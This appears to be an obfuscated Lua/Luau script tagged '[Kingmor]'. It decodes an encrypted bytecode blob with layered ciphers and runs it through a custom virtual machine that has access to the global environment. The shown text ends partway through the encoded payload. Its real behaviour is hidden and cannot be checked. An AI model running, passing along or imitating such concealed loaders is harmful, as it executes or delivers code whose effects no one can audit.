local _7aea30
local function _4eec69(msg)
  warn(string.char(91,75,105,110,103,109,111,114,93,32) .. tostring(msg))
  return false
end
local _84399f=(function()
return (function()
local _15a={}
for _xo0=0,255 do _15a[_xo0]=string.char(_xo0) end
local _d4={}
do
  local _o4="-9OkN0Eh58oKcsGCBvu6apZViwgS_T1RemFYxAHIz7UDjWdL3lbrMf2qPQXtJny4"
  for _xo0=1,#_o4 do _d4[string.byte(_o4,_xo0)]=_xo0-1 end
end
local function _4(s)
  local _z3h,_2mw,_wps,_fmg={},0,0,0
  for _xo0=1,#s do
    local _f0v=_d4[string.byte(s,_xo0)]
    if _f0v then
      _wps=_wps*64+_f0v
      _fmg=_fmg+6
      if _fmg>=8 then
        _fmg=_fmg-8
        local _uge=2^_fmg
        _2mw=_2mw+1
        _z3h[_2mw]=_15a[math.floor(_wps/_uge)%256]
        _wps=_wps%_uge
      end
    end
  end
  return table.concat(_z3h)
end
local _13={}
do
  local _5y4="\204F\027L\0172\251\"\030(\n\249\231\137\224\186\2439\172nJ\254\173Ed\005#\236)/\200\018\008~\199\221\142\188\187\1327\023\028\233cr\248YCIw\198\164\234\202[\238\011\183\151l\182\211\242p\203\175\247\228\006\009\229\016\015\215$}h%\127\181>4g\133e\201\025S\158\155\196v\168X\209z<N\226W\232\1438K\\fZ\169\001\219\210m\129\205\239y\138'-\208\145|\171\014Q\195O\220s\128\193\225&\194\003P\002\222\000\024\245\rq\144\163\160\185ai\167\216;:\197\157\031\161T\2411\149\218\162\252\134\1566\244\214t_^.\131!\191\019+\217\170B=\255\154?\146\184\152DG\141\020\192\253]\179bu\174*ok\159jU0\150\223\246\213\021\2305\240\207,x@\189\176\139MRH\153\206{\136\227\178\177\022`\026\2373\180\165\166\190A\147\012 \007\250\140\135\212V\029\235\148\130\004"
  for _xo0=1,256 do _13[string.byte(_5y4,_xo0)]=_xo0-1 end
end
local function _154(S)
  local _x7l,_2dg=3252905431,80
  local _z3h,_2mw,_ktt={},0,0
  local P=223985 A=1307980847 L=1834493
  local K={0,115,190,47,72,131,220,126,147,239,84,226,228,190,7,216,211,161,172,238,142,187,244,53,119,56,52,181,226,57,144,172}
  for _xo0=1,#S do
    _x7l=(P*_x7l+A)%4294967296
    local _l61=string.byte(S,_xo0)
    local _phy=(_x7l%256+K[((_xo0-1)%32)+1]+((_xo0*113+L)%256)+_2dg)%256
    _2dg=_l61
    local _igr=(_13[_l61]-_phy)%256
    _ktt=(_ktt*33+_igr)%4294967296
    _2mw=_2mw+1
    _z3h[_2mw]=_15a[_igr]
  end
  return table.concat(_z3h),_ktt
end
local function _nv(_hd, _se)
local _jy = table.unpack or unpack
local function _uz(...) return { n = select('#', ...), ... } end
local _fb
_fb = function(_px, _ak, _be)
local f6oa1r, _nc, f1be4n = _px.f6oa1r, _px.k, _px.f1be4n
local _xg = {}
local _gn = _px.f9qogw
for _ew = 1, _gn do _xg[_ew] = _ak[_ew] end
local _xc, _ie = {}, 0
if _px.f6hbqt then
local _pm = _ak.n or #_ak
for _ew = _gn + 1, _pm do _ie = _ie + 1; _xc[_ie] = _ak[_ew] end
end
local _tf = _px.f36sgd + 8
local _eh = 1
while true do
local _pi = f6oa1r[_eh]
local _bp = f6oa1r[_eh + 1]
if _pi == 13 then
_xg[_bp] = _xg[f6oa1r[_eh + 2]]
_eh = _eh + 4
elseif _pi == 42 then
_xg[_bp] = _nc[f6oa1r[_eh + 2]]
_eh = _eh + 4
elseif _pi == 25 then
_xg[_bp] = _se[_nc[f6oa1r[_eh + 2]]]
_eh = _eh + 4
elseif _pi == 18 then
local _mq = f6oa1r[_eh + 2]
local _la = _xg[_mq]
if _mq >= 256 then _la = _nc[_mq - 256] end
local _xr = f6oa1r[_eh + 3]
if _xr >= 256 then _xr = _nc[_xr - 256] else _xr = _xg[_xr] end
_xg[_bp] = _la[_xr]
_eh = _eh + 4
elseif _pi == 2 then
local _mq, _xr = f6oa1r[_eh + 2], f6oa1r[_eh + 3]
local _tu = _xg[_bp]
local n = (_mq == 0) and (_tf - _bp) or (_mq - 1)
if _xr == 2 then
if n == 0 then _xg[_bp] = _tu()
elseif n == 1 then _xg[_bp] = _tu(_xg[_bp + 1])
elseif n == 2 then _xg[_bp] = _tu(_xg[_bp + 1], _xg[_bp + 2])
elseif n == 3 then _xg[_bp] = _tu(_xg[_bp + 1], _xg[_bp + 2], _xg[_bp + 3])
else
local _la = {}
for _ew = 1, n do _la[_ew] = _xg[_bp + _ew] end
_xg[_bp] = _tu(_jy(_la, 1, n))
end
elseif _xr == 1 then
if n == 0 then _tu()
elseif n == 1 then _tu(_xg[_bp + 1])
elseif n == 2 then _tu(_xg[_bp + 1], _xg[_bp + 2])
elseif n == 3 then _tu(_xg[_bp + 1], _xg[_bp + 2], _xg[_bp + 3])
else
local _la = {}
for _ew = 1, n do _la[_ew] = _xg[_bp + _ew] end
_tu(_jy(_la, 1, n))
end
else
local _wm
if n == 0 then _wm = _uz(_tu())
elseif n == 1 then _wm = _uz(_tu(_xg[_bp + 1]))
elseif n == 2 then _wm = _uz(_tu(_xg[_bp + 1], _xg[_bp + 2]))
elseif n == 3 then _wm = _uz(_tu(_xg[_bp + 1], _xg[_bp + 2], _xg[_bp + 3]))
elseif n == 4 then _wm = _uz(_tu(_xg[_bp + 1], _xg[_bp + 2], _xg[_bp + 3], _xg[_bp + 4]))
else
local _la = {}
for _ew = 1, n do _la[_ew] = _xg[_bp + _ew] end
_wm = _uz(_tu(_jy(_la, 1, n)))
end
if _xr == 0 then
local _sp = _wm.n
for _ew = 1, _sp do _xg[_bp + _ew - 1] = _wm[_ew] end
if _sp == 0 then _xg[_bp] = nil end
_tf = _bp + _sp - 1
else
local _ho = _xr - 1
for _ew = 1, _ho do _xg[_bp + _ew - 1] = _wm[_ew] end
end
end
_eh = _eh + 4
elseif _pi == 7 then
local _mq, _xr = f6oa1r[_eh + 2], f6oa1r[_eh + 3]
if _mq >= 256 then _mq = _nc[_mq - 256] else _mq = _xg[_mq] end
if _xr >= 256 then _xr = _nc[_xr - 256] else _xr = _xg[_xr] end
_xg[_bp] = _mq + _xr
_eh = _eh + 4
elseif _pi == 17 then
if _xg[_bp] then _eh = _eh + 4 else _eh = _eh + f6oa1r[_eh + 2] * 4 end
elseif _pi == 16 then
_eh = _eh + _bp * 4
elseif _pi == 31 then
local _la = _xg[_bp]
local _mq, _xr = f6oa1r[_eh + 2], f6oa1r[_eh + 3]
if _mq >= 256 then _mq = _nc[_mq - 256] else _mq = _xg[_mq] end
if _xr >= 256 then _xr = _nc[_xr - 256] else _xr = _xg[_xr] end
_la[_mq] = _xr
_eh = _eh + 4
elseif _pi == 33 then
_xg[_bp] = f6oa1r[_eh + 2]
_eh = _eh + 4
elseif _pi == 32 then
if _xg[_bp] then _eh = _eh + f6oa1r[_eh + 2] * 4 else _eh = _eh + 4 end
elseif _pi == 43 then
local _mq = f6oa1r[_eh + 2]
if _mq == 0 then
local n = _tf - _bp + 1
if n <= 0 then return end
local _la = {}
for _ew = 1, n do _la[_ew] = _xg[_bp + _ew - 1] end
return _jy(_la, 1, n)
end
local n = _mq - 1
if n <= 0 then return end
local _la = {}
for _ew = 1, n do _la[_ew] = _xg[_bp + _ew - 1] end
return _jy(_la, 1, n)
elseif _pi == 12 then
local _mq = f6oa1r[_eh + 2]
for _ew = _bp, _bp + _mq - 1 do _xg[_ew] = nil end
_eh = _eh + 4
elseif _pi == 29 or _pi == 40 or _pi == 41 or _pi == 3 or _pi == 37 or _pi == 39 then
local _mq, _xr = f6oa1r[_eh + 2], f6oa1r[_eh + 3]
if _mq >= 256 then _mq = _nc[_mq - 256] else _mq = _xg[_mq] end
if _xr >= 256 then _xr = _nc[_xr - 256] else _xr = _xg[_xr] end
if _pi == 29 then _xg[_bp] = (_mq == _xr)
elseif _pi == 40 then _xg[_bp] = (_mq ~= _xr)
elseif _pi == 41 then _xg[_bp] = (_mq < _xr)
elseif _pi == 3 then _xg[_bp] = (_mq <= _xr)
elseif _pi == 37 then _xg[_bp] = (_mq > _xr)
else _xg[_bp] = (_mq >= _xr) end
_eh = _eh + 4
elseif _pi == 20 or _pi == 8 or _pi == 9 or _pi == 15 or _pi == 22 then
local _mq, _xr = f6oa1r[_eh + 2], f6oa1r[_eh + 3]
if _mq >= 256 then _mq = _nc[_mq - 256] else _mq = _xg[_mq] end
if _xr >= 256 then _xr = _nc[_xr - 256] else _xr = _xg[_xr] end
if _pi == 20 then _xg[_bp] = _mq - _xr
elseif _pi == 8 then _xg[_bp] = _mq * _xr
elseif _pi == 9 then _xg[_bp] = _mq / _xr
elseif _pi == 15 then _xg[_bp] = _mq % _xr
else _xg[_bp] = _mq ^ _xr end
_eh = _eh + 4
elseif _pi == 14 then
_xg[_bp] = (f6oa1r[_eh + 2] ~= 0)
_eh = _eh + 4
elseif _pi == 27 then
_xg[_bp] = {}
_eh = _eh + 4
elseif _pi == 1 then
local _la = _xg[_bp]
local _mq, _xr = f6oa1r[_eh + 2], f6oa1r[_eh + 3]
if _mq == 0 then _mq = _tf - _bp end
local _ll = _xr - 1
for _ew = 1, _mq do _la[_ll + _ew] = _xg[_bp + _ew] end
_eh = _eh + 4
elseif _pi == 23 then
local _mq = _xg[f6oa1r[_eh + 2]]
local _xr = f6oa1r[_eh + 3]
if _xr >= 256 then _xr = _nc[_xr - 256] else _xr = _xg[_xr] end
_xg[_bp] = _mq[_xr]
_xg[_bp + 1] = _mq
_eh = _eh + 4
elseif _pi == 26 then
local _mq, _xr = f6oa1r[_eh + 2], f6oa1r[_eh + 3]
local _az = _xg[_mq]
for _ew = _mq + 1, _xr do _az = _az .. _xg[_ew] end
_xg[_bp] = _az
_eh = _eh + 4
elseif _pi == 4 then
local _vw = f1be4n[f6oa1r[_eh + 2]]
local f1nkhe = {}
local _zt = _vw.f1nkhe
for _ew = 1, #_zt do
local _kv = _zt[_ew]
if _kv.f4wyde then f1nkhe[_ew] = _xg[_kv.f260t4] else f1nkhe[_ew] = _be[_kv.f260t4] end
end
_xg[_bp] = function(...) return _fb(_vw, _uz(...), f1nkhe) end
_eh = _eh + 4
elseif _pi == 36 then
local _mq = f6oa1r[_eh + 2]
if _mq == 0 then
for _ew = 1, _ie do _xg[_bp + _ew - 1] = _xc[_ew] end
_tf = _bp + _ie - 1
else
local n = _mq - 1
for _ew = 1, n do _xg[_bp + _ew - 1] = _xc[_ew] end
end
_eh = _eh + 4
elseif _pi == 30 then
_xg[_bp] = _be[f6oa1r[_eh + 2]][1]
_eh = _eh + 4
elseif _pi == 35 then
_be[_bp][1] = _xg[f6oa1r[_eh + 2]]
_eh = _eh + 4
elseif _pi == 6 then
_xg[_bp] = {}
_eh = _eh + 4
elseif _pi == 24 then
_xg[_bp] = _xg[f6oa1r[_eh + 2]][1]
_eh = _eh + 4
elseif _pi == 34 then
local _la = _xg[_bp]
_la[1] = _xg[f6oa1r[_eh + 2]]
_eh = _eh + 4
elseif _pi == 11 then
local _la = _xg[_bp]
local n = f6oa1r[_eh + 3] - 1
local _ew = f6oa1r[_eh + 2]
while _ew <= _tf do n = n + 1; _la[n] = _xg[_ew]; _ew = _ew + 1 end
_eh = _eh + 4
elseif _pi == 5 then
local _tu = _xg[_bp]
if type(_tu) ~= 'function' then
local _la = getmetatable(_tu)
local _mq, _xr
if type(_la) == 'table' then _mq = rawget(_la, '__iter'); _xr = rawget(_la, '__call') end
if _mq ~= nil then
_xg[_bp], _xg[_bp + 1], _xg[_bp + 2] = _mq(_tu)
elseif type(_tu) == 'table' and (_la == nil or (type(_la) == 'table' and _xr == nil)) then
_xg[_bp], _xg[_bp + 1], _xg[_bp + 2] = next, _tu, nil
end
end
_eh = _eh + 4
elseif _pi == 21 then
_se[_nc[_bp]] = _xg[f6oa1r[_eh + 2]]
_eh = _eh + 4
elseif _pi == 10 then
local _mq = f6oa1r[_eh + 2]
if _mq >= 256 then _mq = _nc[_mq - 256] else _mq = _xg[_mq] end
_xg[_bp] = -_mq
_eh = _eh + 4
elseif _pi == 38 then
local _mq = f6oa1r[_eh + 2]
if _mq >= 256 then _mq = _nc[_mq - 256] else _mq = _xg[_mq] end
_xg[_bp] = not _mq
_eh = _eh + 4
elseif _pi == 28 then
local _mq = f6oa1r[_eh + 2]
if _mq >= 256 then _mq = _nc[_mq - 256] else _mq = _xg[_mq] end
_xg[_bp] = #_mq
_eh = _eh + 4
elseif _pi == 19 then
local _mq, _xr = f6oa1r[_eh + 2], f6oa1r[_eh + 3]
if _mq >= 256 then _mq = _nc[_mq - 256] else _mq = _xg[_mq] end
if _xr >= 256 then _xr = _nc[_xr - 256] else _xr = _xg[_xr] end
_xg[_bp] = math.floor(_mq / _xr)
_eh = _eh + 4
else
error(('E'..tostring(_pi)), 0)
end
end
end
return _fb(_hd, { n = 0 }, {})
end
local function _yw(_az, _qy, _dg)
_qy = _qy or 1
local function KMVX8(_bp,_xr)
_bp=_bp%256 _xr=_xr%256
local r,_px=0,1
for _=1,8 do
local _wb,w=_bp%2,_xr%2
if _wb~=w then r=r+_px end
_bp=(_bp-_wb)/2 _xr=(_xr-w)/2 _px=_px*2
end
return r
end
_dg = _dg or 26106
local function _gc()
local _mq = string.byte(_az, _qy)
_qy = _qy + 1
_dg = (_dg * 272 + 32249) % 65521
local _nc = _dg % 256
local v = _mq - _nc
if v < 0 then v = v + 256 end
return v
end
local function _rd()
local n, _oh = 0, 1
while true do
local _mq = _gc()
n = n + (_mq % 128) * _oh
if _mq < 128 then break end
_oh = _oh * 128
end
return n
end
local function _cf()
local n = _rd()
if n % 2 == 1 then return -math.floor((n + 1) / 2) end
return math.floor(n / 2)
end
local function _ng()
local _px = {}
_px.f9qogw = _rd()
_px.f6hbqt = (_gc() == 1)
_px.f36sgd = _rd()
local _ro = _rd()
_px.f1nkhe = {}
for _ew = 1, _ro do
local f4wyde = (_gc() == 1)
_px.f1nkhe[_ew] = { f4wyde = f4wyde, f260t4 = _rd() }
end
local _kk = _rd()
_px.k = {}
for _ew = 1, _kk do
local _fi = _gc()
if _fi == 0 then _px.k[_ew] = nil
elseif _fi == 1 then _px.k[_ew] = false
elseif _fi == 2 then _px.k[_ew] = true
elseif _fi == 5 then
_px.k[_ew] = _cf()
elseif _fi == 3 or _fi == 4 then
local _dr = _rd()
local _uv = {}
local m = 69
for j = 1, _dr do
_uv[j] = string.char(KMVX8(_gc(), m))
m = (m * 229 + 164) % 256
end
if _fi == 3 then _px.k[_ew] = tonumber(table.concat(_uv)) else _px.k[_ew] = table.concat(_uv) end
else
_px.k[_ew] = nil
end
end
local _zi = _rd()
local _nr, _cq = _rd(), _rd()
_px.f6oa1r = {}
if _zi > 0 then
local _ys = {}
for _ew = 1, _zi do
_ys[_ew * 4 - 3] = _rd()
_ys[_ew * 4 - 2] = _cf()
_ys[_ew * 4 - 1] = _cf()
_ys[_ew * 4] = _cf()
end
local _yd = {}
for _ew = 0, _zi - 1 do _yd[((_ew * _nr) + _cq) % _zi] = _ew end
for _ew = 1, _zi do
local _fx = _yd[_ew - 1] + 1
local q = _ew * 4
local _kv = _fx * 4
_px.f6oa1r[_kv - 3] = _ys[q - 3]
_px.f6oa1r[_kv - 2] = _ys[q - 2]
_px.f6oa1r[_kv - 1] = _ys[q - 1]
_px.f6oa1r[_kv] = _ys[q]
end
end
local _uk = _rd()
_px.f1be4n = {}
for _ew = 1, _uk do _px.f1be4n[_ew] = _ng() end
return _px
end
local _vw = _ng()
return _vw, _qy, _dg
end
local _a={
"vWEbJtGN1yFn36on5NI6thPj0jtV3-6pl7IohGO1yRH01wTXdsmUShECNrWXaQm-EXOoBcGLg52OOt5yJ59OFdvuZ8Md-bn4UXATEQaHy-KiahMauvaEPdDMceYnzqb1wvCu4zujTMG2kHdAt7zNruJUc_3UClqNg7FjBumiygL6fGJI_9RreiuBi_go-I2DeoxqYBoZVVfNy0M7wU-9lPD2LEkKlWOKX9X2J7USUZ_Rzy90D3VZH3RfXlfi_84BQ0uwEEy2_cQKfF8vMLABlXktS8LNHKxwNzZtrb9vFzTnlOV-sYmheS2W8E9k5HujcGc4r_bkyJG9d0pjHkEDv1txUhc--fT36gSlQY9HEMamvC73vMDxAIbmEI0zyVzJZ-HfjvT6sYRUH132r5D-MdkLWln8w2FsSpRMUpFNG9FEk4WlZCZ3UV40W3_l7vvpLOc-W32KyePaQMBobwpweudRZJJ8UIYvTgI7IijzSjfmrBshDhNLvbUQFd_KJchq8xEXZ5nylT2hP4xDgo9Ge81GjUb3XsmT1xzaCKPYq5qTY2nCY3vmi17dgo69Esu0wp-oEVnV5VR1vSGStFBZjMPMZIbOMHD62ME5QCEjsLHQKSezrZE7lg8pvXMCr0nJsbdu82QJs-j6KYB-XSWNUfBXNhmnEo8Q4a1WncFnqyvGSo9pvB5SJIJ2ievFGapi2BuklTN_1QS8GCVk0FOqIvokU4IPFF1ioFAYF3tIAFzIsHBZS8GjDHICf7qBvl1IoQuScx6K0PCIh630HbjgylipyVPRs6u4VnjQCSdNUe2qJ76gluiSkcb4y_ql6mr_S40RXkyEaQA1iCiv0HSdrWg339AoE_Wc6lZRG0SeTtmonnlvWjep0Q6pJKiejyMMne6JrXxBEEWxNssGutzZPbN8oDe3M16-r1TT2N1tdBQh-2ODbyNp-M1KCYNG_hbCXddi3nBjFhX2BFDgyDxsQyJex9S1wZBuUeSaW-Hl_eRMO9a1dzaHoVnGKF5TG6jEN8KgrnXzkwVRdFIIPADuinKdV-UQetSiuXBLU9IjVLDUSfqsv-yjElrvedw58fqlcJDrJkaROSlCpnK1rZ4kc7uNq9wK19XkA-yXCsngIYfiBWajNhTNUnMuKFinJePD3YITHSJyu9VG2bsJtwK4_wmhiRlL0ojn02EW2GkmloBC2J8okYhi9uWyqHEHXWkUjii8RKApH9F279RMGmUO280Fg16YCiu0u93LflQaPtXfN6ZfaQ-OX7Dz5V8r-c50lyMB5d7RPCYhhVBKkxiZ_urwS-CvryYL2VR77YGnde75U_YtRmlxJFMxUX33Z1kv8a42lygHaynPpGJShv_0GoOIPfO4PBGqIJcLXlpEzDKzwLWu42tDmwZWL1aezRxh0NiQMx7kHzfhu7dapjo1tQQR2dJQnNZ7vZEvTVBkD0fDlobiIjpx5dd9780XY1ARIEFuBFLcQB41rWPtRtPFa7vfLuLTXKpbx8DCYp9TRZpQQsNLFbHwD5u_o17DI2q6dHxWlFiN4WKubmSLcFV3PvallIPAEK3RX4j_E47zFIe4dKnBnnpoCpYvDfgy2v4esf9EDSHriWTFDTZZEtC65kYX9RnttHMiymcGUDRVFi4z4Siv8bdOa3K5jBXAxqwGBCvOTmvk8GxZeUzcuBE9z4ZcNZ9S-psaGvt25E4SmTfUgHot9jUPYenypGNHLIOlCnJTV3PCBQIA60_FjAkMQP17AqgAtYayyoDeBYZKkHDDVkMcCqy2hIA6qT5ZW8GA9fBwJn8fL7Quiw4FQksFpyxt9ZYJpb88lMn1eclaXZ6l3oOK2EH-GYC6lkMW15i8VH_JGY3zoGayPtes4lVvQRtNkOX8BK4AfRZPDAs7LA_FCAeh3evBb1I9cE_wMrlmqtVYSXCdpQP6PgEgoKRWmsTydjzJmKa1_kkeCZHbP8Ygz54OKqk93HRJoFCJswGA64zn_rW33HtZt_ae48M3xsTrsdvkHJ373na-qOcvmOzGvl9Pbe_dJV2SnyBQS2HCZl5BkTmWsidmOpaOVrd51ew3yRVZ40essbC_AAw-qWYUMaSr0-mEruLSdEIU6VXYPQaXEBMx6_0_Pb4yxi-Sq0GIPLBoK8RkLOrJbfsZpCvwz1N06mR3nAvB64hfgeps4ooZ1w4ir1rO4tTbJX_mQ0h5dV9bGSLJSTzXUoi6GFG9gbBvMhfAAaXDGM-4bIF60_euaA3XuyUXaTWDOQD90gjHf3V7tEvpS11wYz1nZGXzQYHwpejESoc4FSYQM_oiuoDnCcV9XWSIzQxE8EtEUaiu2Z5Te1ip_bJ5ffaoMIQSiWrVmoc5ZzcwWFsKv6dTKjFISJ_0KrmGhiA7kMLGfYdkWUOqDNa7yKhIhpbl46d-MmriudAz6d1o0ISHPEhky1-nPir5jrgfSYy7KSLQpYVtwRYCb27lgBaJExfRSqWS4tKQ4qLHC38yffISd6SGdtyB-t5n1aA2o7zOo3PFglH0CNH4RrgJLFgQL8YShq06VcB0tkWeV6CcHAL2czbr4PfyMFlWSnQhDnU9i8V3fZqv950pW2b0v7um6aeUxtL5_rot68VyTsPILHnboRsNnVK5o9FFXi8PJojdBinu4OqZMrT8z-PLfAiTF9BSuvUSagSQ9zoQ7stSg2Ofvp6tWQu3l_nIEyOsz81QTiGSkdvvbxbCqtWlLQsOctbLy7JxO0yfwoSGlgKAdgb90RUGuUOJ1Yp_57M_1PE0gHyxXIPfz21qhd4rYOYmS-8-o6X4cV5f7AHxm3tSAXQpRtNRmVfxz2as8fMNPZDVayF4T_RSFyqrDcHXAX2T1Q81oMnkxixyDLg5GEYwvinT7jiTT5ElmXL7VdhqCuA8xBntYzY4Z82gt8TF1zmZi8x0E8Xc-pTDvdl9oxBufWB22SMaLtrli1O5NjWxitIr7tkjytIhyeholJXK09vdjXmRZFkQaeY1BT0h_OSqtDI_h_qnbfj-NNn7kxxL2YjOWGKvpJMcPBtnkm8qJb9PYLuQ1vaSyKHKtkJc4IAMUsHVekmSVB4_5H2yZUaeVyS_bDqk_iLoK1P06Y7Qe4Njy7IP_CDgFVoKAX6IKyeqkzVGmOb6HLE6zNYbZbVl8GJ8HLK3aRQSbh-69a59w90TgzQBbszgkdJoHC4gLXh-GxvgtXzZM7YvktTdvvIbK6tLMlr4X7Z8a8CVa_tXRiXO-meMfFpiT6_MhVy9XDKIx9SmD87qHdbtWKYkCqlShY9TfIOl7ZoSa-G1TbDFc6GClB6lZUy8BSIwTSFsof-rQ1SL6c4XC82j_Qu-zLzI1i1QPaO1HM9zN6bW-9W-B_zKxNPds24Tp2Nfm8V-6hlU8YiiJ2HRM4jA32NlBnCaBbe3YXWNwXcIGhnLcvXQwFdfT8PdZKuyhzLVbWBYNZG2teKHPq7cXngMOnHHqGl7PYo_3uum1-DD2H_RH2U4eI7N7HcRWwNCoT0Df4BmMndLLLLhaHkvRXTxi0Sg4JuzVjM5-rJO0d3SvwFQlO8J5zMFMsGJhmGQSmea2VFoj_TWG-H-bhFh9R2-TZzZyL_H4qEba_alNXNzYSne3FC-7_S3eAItNQqMu6h49XEJ-r1ZVXCg5kLlKKePl7fyeg36V3Phcdevzu1nVGmSVjkq5tHVJ75hKDGl6XXCw_EqpGiDh_DCQ7UqeasJ0vAJqdbFY0KvbyC6bQnJ589L0rKdDMULhm6gjgUZIgnCbDKbcL64g5va-8dw_HCCu97ApC89yYwI395Kg7CzL8dG3nHyse_hfGJ6FIZkjI2CMoI2kenIAYt9kj9lAudcy76gqedMux2XRfY9ydSbUTH88AhU6vf66efHpTKjin8XlnNcRsoLBEl27sNlhOLMZq-9B_rOmvsZ0_7aOA6cDFimRLuwhB3MVm6LKyuoXVc8jFxm-rQYXuhHAPV2I7YOfEPuyVz1_GEDXVZyxHY3KvU70AqIUnXCw_c1B9yqRz242_nMW7TioxLhSK99yudvPHat5AsI9OEhjzj9BBv4yIN703UFv6GJyEYs9gGEErA2oISlGAS9BVtK-DVjwOu7uuEI4w6VYkOHRrIKapnh2ylnge3MPVBgE2knSlx-ruph-Eg_g7AxabvA1Vsv9Ll4eHzwn-yY7e7O38VUlVHWtNA3ViTV1I8TyKY7d7hE771pTWEu0F3TIETCIiyVIZTzEeJLGlBrXuR7KTgvblhDhXVtCr62N6V3yYFJG3PP870dA_2Gp19AN-c2rk3gqzZBOyYbUBMTlLlzdWwRWO8VYzahL2UxwZXW6Ym0jYgPr9LN7LViXBPVWnxnD_WMTTil6G1LtvptvW3REkyRRcq_8QxNUTDOdsgiTpfMsSf4aY_dTprpYCFm8yvS5oQ76V2cvMonml4VfOqmPaVb_NRE49FtGhoHUIsSiJgV-gzsYU-EXI-Z0BOFee-wzI5bEUUm1R5jtSDeCCGGxf6_1kZ7E4ByvPnvM9-HwPlc97UNML4709QIB3nwjbgrbdEq289AfvTcgoSd0BGTIwwEJ3-Z9JSRLmat7LrRHBMrTJCyLK4qlfKwYX5Yv7jgu9oWY7KkS3Epry3tHVbyATux22CPRQjrjOts3ZDjaRmeEBA4Ti16ROXCurGQVGCfs1QpiWnJYF97BrEGUh1_Y3a2hP6vZM-ZckLJ8SStdkxlvbdxqqgObqR4XhpSvrTJmj3CSYycLDvRvJj1R8gZcXc7da7lMOaGuZVEYTwmQavtKj302m33EvPltqWArdm0MdB-JHnboWVk8IzQhVZzAmph5AnIAvpBIcFeorb2Tk-xiZSt2phrMENV5mN4AHIykTHW7klw62Latn7P51aOIYBpYiTv6UvNz1UDdm1y9_VW5NIQ_eXjD9jpuY9qcYLKJpLJu_ag1FHnkd2LQkSBMh08wZLTNJNTvsjQncjZCKfFXhJJsFFGN8v7Y4VikcY8wPMk1f9CjIwZ3aQHki9R4nlDHdpqh8I7QOIpZdVZGNKTa8gpO35c6rYEqzkXVtOrxVJgrFGtWlxjux4t8h6kKg99H1_FfvqlxN1-P9wUNmeDmObrRk_rffZx95tgJjF-NVikI6GEelsgzl0igQLKGAeQSP5tOq0GkXRFju9MqfpYuGMV6LESOeE4ovJUuOdm5SgU3mmTLPeDqFcoXERXlcrWlK_zi7UmBksJofvCL_AlRWKCATxN8Mcq6VisQTua7KhvKEf9ix8phUB3KW_RSfog5bP4Ga6OogeXeqdLIXfLBnIT7LVuSiRjH7xmG4nxyvq4eUVndfTqP7tPWOKmawiYTvFbSwXGyb-0XI9ngWyZHVyC_8Je87hf6Jty6O87LKX3TFuJsmI6pL0XdKwrFGbRX0KQmd7RbofQjRQVHtvNKSDaVyer1NEjzbsvPhkAhrIh4yA3Jeg0NnCHPH5wrUkJ7VlkHdrUaoWpwV1oF5dxWnkzIjzPDcd3kwreFphhGSWc2vQlarFhCsxS1uI-udiGZ2RmkeU956Xv04F5G9VDtQHqinzdH-AoHVd5vGTyG2nEG6OyBdjP9A4B5OxBuiWHm9enUjOaTJhGpEIS4JBM06Ienj0pj7hb-fDX1zE0S3k3_o9TLi-0WQvF6MBus47UV0hdni_MND3r_KfquelC1cjdeoaYStgWUVDcb1tCnRcyB7-joKNztCD2whP1NLXBcRdYABMOT-DBd8Do7YsH-lY2xLmdYHqABBVYvYI4lkhDzHa3E8NTEGtiAMzY_rcTTPESHdAL2YjWQaRYjMYTmuoq_A3PwrTXvjBsZTy-iF7yZ2Oheh2Sxvcm3MB7AwvxAOrX8GHT1gV3sV8WzK5Pc7vdwg71k3ym6F50CLRS-hIaoWlv7msVPaJy_n3Lngm6PeAVTMRCQ-xVY1T-n9YxmyXZo0X7QbQIQpRvbY5xdUnGcF-FrsFFgVNUEfvi8dSv6fPpEGQh3lFCk5QWGUBUV5iZyyEoZytVcX9AIdgaQxYOh_SIZJQ4-yAISEoajzY7cK1Icpp7VZCg_bTjl-XifbK-oSE8jPDOJInjgAxJFerbZROHgY6w7HBsLFARuR7qGzX4ZYeQ6sxFRN7-HJdYdUqSQI94qzlPhlicq0emw9XrVvSKde4VsvkQkTzK1VmtI-gn2oFDzv75C69BE47Nc_VcsU58tbL_ahKtpdtbPS9eZhnXKXuGv3--fK-F4OQkQMJyme671opXPua-v2JyauCStQgboDG8CQaEGNriwKA0w6SntXNkvyF-PTERVRoCeDGtL1PAZnqCunqCUdYo2gk9RXA72SGrkxEnJ8StM-abt7HpJFblDn6dq4San33VN47PA4WsRieFzMdD9BLCE1C5H0PImSKGYmdtbjzOIBPTWJyYoWnELEpCK9P3O3Wg5qT6HgyCLQ8LWc-5meAtFZOep-_ThCLz8CNGC8DbxQLN9z4p8fUPXWd5Se21_gs7iA6Hx5lKiBXBmlQX280g5G6JNdaVYejFBZpZGrJ-HDYphvKHWh6mL7NLXKO623ebVjQ1ViUPrWJkzHJss790VgR709aFyHkQ2MGWlUHKb3cKuJG1uSwYvQUggiL5TDB5-YNd4sUuOMIF_k8NSjMTQZuRdoUnyiisYkrYtuZNO6UZxGbGw-Y-4j7tu4ihjt9BX2npHvaQbRUNca5DwPfi82dJc2RLL-yAAY4cKb3ivUPxWjsNvDsldlre4XE4ncfLx3uA2gZhu_8tw8ja0ClVpqT8w520MljFAGsIAoB8BgDO-KQNyAaKlu3I7MGPyVKEO3RZCJDCxtpn6QacApoake9mxYwtsZjM3lfWNTSE7ah4qdQbX5dzyZj2ZshpYP0mVKEdEuJSrSJlOLNKNmWwktcY-Ir7ji2i9b1YoL2UbKhpvBS9VW12Zg4Y0dJiadR_gooujbBdcEdlIkyDhgKeoXG8_hT00zDEOnU1Ft8SyejiEX_AC62sAjr-",
